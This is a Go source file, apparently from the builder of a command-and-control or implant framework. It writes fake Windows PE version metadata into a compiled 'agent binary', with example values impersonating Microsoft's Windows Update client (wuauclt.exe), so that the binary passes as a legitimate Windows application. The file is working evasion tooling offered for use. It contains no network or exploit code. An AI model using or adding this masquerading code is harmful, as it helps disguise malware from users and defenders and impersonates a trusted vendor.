package builder

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/josephspurrier/goversioninfo"
)

// MasqueradeConfig defines fake PE metadata to embed in the compiled binary.
// When enabled, the agent binary appears to be a legitimate Windows application.
type MasqueradeConfig struct {
	Enabled          bool   `json:"enabled" yaml:"enabled"`
	Company          string `json:"company" yaml:"company"`                     // e.g. "Microsoft Corporation"
	Product          string `json:"product" yaml:"product"`                     // e.g. "Windows Update"
	Description      string `json:"description" yaml:"description"`             // e.g. "Windows Update Assistant"
	OriginalFilename string `json:"original_filename" yaml:"original_filename"` // e.g. "wuauclt.exe"
	Version          string `json:"version" yaml:"version"`                     // e.g. "10.0.19041.1"
	Copyright        string `json:"copyright" yaml:"copyright"`                 // defaults to "© <Company>. All rights reserved."
}

// applyMasquerade writes a resource.syso file into sourceDir with fake PE metadata.
// The Go toolchain automatically links .syso files when building Windows targets.
// Returns a cleanup function that removes the generated file.
func applyMasquerade(sourceDir string, cfg MasqueradeConfig, arch string) (cleanup func(), err error) {
	ms, ls := parseVersion(cfg.Version)

	vi := &goversioninfo.VersionInfo{}
	vi.FixedFileInfo.FileVersion.Major = int(ms >> 16)
	vi.FixedFileInfo.FileVersion.Minor = int(ms & 0xFFFF)
	vi.FixedFileInfo.FileVersion.Patch = int(ls >> 16)
	vi.FixedFileInfo.FileVersion.Build = int(ls & 0xFFFF)
	vi.FixedFileInfo.ProductVersion = vi.FixedFileInfo.FileVersion
	vi.FixedFileInfo.FileType = "VFT_APP"

	copyright := cfg.Copyright
	if copyright == "" {
		copyright = fmt.Sprintf("© %s. All rights reserved.", cfg.Company)
	}
	internal := strings.TrimSuffix(cfg.OriginalFilename, ".exe")

	vi.StringFileInfo = goversioninfo.StringFileInfo{
		CompanyName:      cfg.Company,
		FileDescription:  cfg.Description,
		FileVersion:      cfg.Version,
		InternalName:     internal,
		LegalCopyright:   copyright,
		OriginalFilename: cfg.OriginalFilename,
		ProductName:      cfg.Product,
		ProductVersion:   cfg.Version,
	}
	vi.VarFileInfo.Translation.LangID = goversioninfo.LngUSEnglish
	vi.VarFileInfo.Translation.CharsetID = goversioninfo.CsUnicode

	vi.Build()
	vi.Walk()

	goarch := arch
	if goarch == "" {
		goarch = "amd64"
	}
	sysoPath := filepath.Join(sourceDir, "resource.syso")
	if err := vi.WriteSyso(sysoPath, goarch); err != nil {
		return nil, fmt.Errorf("write resource.syso: %w", err)
	}

	return func() { os.Remove(sysoPath) }, nil
}

// parseVersion parses "major.minor.patch.build" into MS/LS DWORD pairs.
func parseVersion(v string) (ms, ls uint32) {
	parts := strings.Split(v, ".")
	get := func(i int) uint32 {
		if i >= len(parts) {
			return 0
		}
		n, _ := strconv.ParseUint(parts[i], 10, 32)
		return uint32(n)
	}
	ms = (get(0) << 16) | get(1)
	ls = (get(2) << 16) | get(3)
	return
}
